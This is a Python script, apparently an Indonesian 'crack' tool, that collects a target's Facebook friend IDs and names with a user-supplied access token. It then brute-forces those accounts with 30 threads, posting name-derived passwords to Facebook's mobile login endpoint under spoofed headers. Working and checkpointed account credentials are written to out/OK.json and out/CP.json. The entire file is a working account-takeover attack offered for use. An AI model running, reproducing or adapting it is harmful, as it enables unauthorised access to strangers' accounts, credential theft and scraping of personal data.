import os, sys
try:
	import requests
except ImportError:
	os.system('pip install requests')
try:
	import cython
except ImportError:
	os.system('pip install cython')
import requests, cython, json, re, random, time, datetime
from multiprocessing.pool import ThreadPool as th
from requests.exceptions import ConnectionError
from datetime import datetime

logo = ("""\033[1;92m    ║\033[1;91m████████
\033[1;92m    ║\033[1;97m████████
\033[1;92m    ║
    ║
    ║
    ║
    ║
\033[1;92m    ║
\033[1;92m    ║
\033[1;92m    ║
\033[1;92m  _/ \_\033[0m""")

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def tokenz():
	os.system('clear')
	print(logo)
	print ('───────────────────────────────────────────');time.sleep(0.07)
	toket = input('  (☆) Enter Token : ');time.sleep(0.07)
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open('login.log', 'w')
		zedd.write(toket)
		zedd.close()
		jalan('\n  Login Berhasil...');time.sleep(0.07)
		time.sleep(1)
		menu()
	except KeyError:
		print('\n  (!) Token Salah');time.sleep(0.07)
		os.system('rm -rf login.log')
		time.sleep(1)
		tokenz()
	except requests.exceptions.ConnectionError:
		exit('\n  (!) Tidak Ada Koneksi Internet');time.sleep(0.07)

def menu():
	os.system('clear')
	try:
		toket = open('login.log','r').read()
	except IOError:
		os.system('rm -rf login.log')
		tokenz()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
	except KeyError:
		print('  (!) Token Eror');time.sleep(0.07)
		os.system('rm -rf login.log')
		time.sleep(1)
		tokenz()
	except requests.exceptions.ConnectionError:
		exit('  (!) Tidak Ada Koneksi Internet');time.sleep(0.07)
	print(logo)
	print('───────────────────────────────────────────');time.sleep(0.07)
	jalan('  (☆) USER : '+nama.upper())
	print('───────────────────────────────────────────');time.sleep(0.07)
	print('  (1) Dump ID Indonesia');time.sleep(0.07)
	print('  (2) Mulai Crack');time.sleep(0.07)
	print('  (0) Keluar');time.sleep(0.07)
	pilih()

def pilih():
	unikers = input('\n  ︻デ═一▸ ');time.sleep(0.07)
	if unikers =='':
		print('\n  (!) Isi Yang Benar');time.sleep(0.07)
		pilih()
	elif unikers =='1':
		exit(dump_id())
	elif unikers =='2':
		exit(Brute().main())
	elif unikers =='0':
		jalan('\n  Menghapus Token...');time.sleep(0.07)
		os.system('rm -rf login.log')
		time.sleep(1)
		os.system('clear')
		exit()
	else:
		print('\n  (!) Isi Yang Benar');time.sleep(0.07)
		pilih()

def dump_id():
	id = []
	global toket
	try:
		toket = open('login.log','r').read()
	except IOError:
		print('  (!) Token Eror');time.sleep(0.07)
		os.system('rm -rf login.log')
		time.sleep(1)
		tokenz()
	try:
		os.mkdir('dump')
	except OSError:
		pass
	try:
		os.system('clear')
		print(logo)
		print('───────────────────────────────────────────');time.sleep(0.07)
		idt = input('  (☆) Enter ID : ');time.sleep(0.07)
		try:
			jok = requests.get('https://graph.facebook.com/v2.0/'+idt+'?access_token='+toket)
			op = json.loads(jok.text)
			print('  (☆) Nama : '+op['name']);time.sleep(0.07)
		except KeyError:
			print('\n  (!) ID Tidak Ada');time.sleep(0.07)
			input('  (Kembali)');time.sleep(0.07)
			menu()
		r=requests.get('https://graph.facebook.com/v2.0/'+idt+'?fields=friends.limit(9999999)&access_token='+toket)
		z=json.loads(r.text)
		jalan('  (☆) Mengambil Semua Id...');time.sleep(0.07)
		print('───────────────────────────────────────────');time.sleep(0.07)
		bz = open('dump/id.json','a')
		for a in z['friends']['data']:
			id.append(a['id']+a['name'])
			bz.write('{'+"""\"uid\""""+': '+"""\""""+a['id']+"""\""""+', '+"""\"name\""""+': '+"""\""""+a['name'].lower()+"""\""""+'},\n')
			print('facebook.com/'+a['id'])
			if a['id'][:6] in ['100050']:
				bz.close()
				print('───────────────────────────────────────────');time.sleep(0.07)
				print('  (☆) Selesai...');time.sleep(0.07)
				print('  (☆) Total ID > '+str(len(id)));time.sleep(0.07)
				print('  (☆) File Tersimpan : dump/id.json');time.sleep(0.07)
				input('  (Kembali)');time.sleep(0.07)
				os.system('python R.py')
	except KeyError:
		print('\n  (!) Teman Tidak Ada');time.sleep(0.07)
		input('  (Kembali)');time.sleep(0.07)
		menu()

class Brute:
	def __init__(self):
		self.setpw = False
		self.ok = []
		self.cp = []
		self.loop = 0

	def brute(self, users):
		sys.stdout.write(
			'\r  [\033[0;96m{}\033[0m] Cracking {}/{} OK-\033[0;92m{}\033[0m CP-\033[0;33m{}\033[0m '.format(datetime.now().strftime('%H:%M:%S'), self.loop, len(self.target), len(self.ok), len(self.cp))
		);sys.stdout.flush()
		for pw in users['pw']:
			try:
				username = users['id'].lower()
				password = pw.lower()
				gas = requests.Session()
				headersx = ({"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.2 Chrome/56.0.2924.87 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
				pet = gas.get("https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",headers=headersx).text
				dataz = ({"lsd":re.search('name="lsd" value="(.*?)"',str(pet)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"',str(pet)).group(1),"uid":username,"flow":"login_no_pin","pass":password,"next":"https://developers.facebook.com/tools/debug/accesstoken/"})
				headersz = ({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
				pot = gas.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0",data=dataz,headers=headersz,allow_redirects=False)
				if "c_user" in gas.cookies.get_dict():
					self.ok.append(username+'|'+password)
					print('\r\033[0;92m  *--> %s Φ %s                    \033[0m'%(username,password))
					save = open('out/OK.json','a')
					save.write('facebook.com/'+str(username)+' Φ '+str(password)+'\n')
					save.close()
					break
				elif "checkpoint" in gas.cookies.get_dict():
					self.cp.append(username+'|'+password)
					print('\r\033[0;33m  *--> %s Φ %s                    \033[0m'%(username,password))
					save = open('out/CP.json','a')
					save.write('facebook.com/'+str(username)+' Φ '+str(password)+'\n')
					save.close()
					break
			except requests.exceptions.ConnectionError:
				time.sleep(2)
				continue
			except: pass
		self.loop +=1
	
	def main(self):
		while True:
			file = input('\n  (☆) Nama File : ');time.sleep(0.07)
			try:
				list = open(file, 'r').read()
				object = json.loads(list)
				break
			except IOError:
				print("\n  (☆) File Salah '%s' "%file);time.sleep(0.07)
				time.sleep(1)
				menu()
		self.target = []
		for user in object:
			try:
				obj = user['name'].split(' ')
				if len(obj) == 1:
					listpass = [
						obj[0]+'123',
						obj[0]+'12345',
						obj[0],
					]
				elif len(obj) == 2:
					listpass = [
						obj[0]+'123',
						obj[0]+obj[1]+'123',
						obj[0]+obj[1],
						obj[1],
					]
				elif len(obj) == 3:
					listpass = [
						obj[0]+obj[1],
						obj[0]+obj[1]+'123',
						obj[1]+obj[2],
						obj[2],
					]
				elif len(obj) == 4:
					listpass = [
						obj[0]+obj[1],
						obj[0]+obj[1]+'123',
						obj[1]+obj[2],
						obj[2]+obj[3],
						obj[3],
					]
				self.target.append({'id': user['uid'], 'pw': listpass})
			except: pass
		if self.setpw == False:
			self.loop +=1
		print('\n  (☆) Crack Started...\n  (☆) Account [OK] Saved To : out/OK.json\n  (☆) Account [CP] Saved To : out/CP.json');time.sleep(0.07)
		print('───────────────────────────────────────────');time.sleep(0.07)
		th(30).map(self.brute, self.target)
		exit('\n\n  (☆) Selesai...');time.sleep(0.07)

if __name__ == '__main__':
	exit(menu())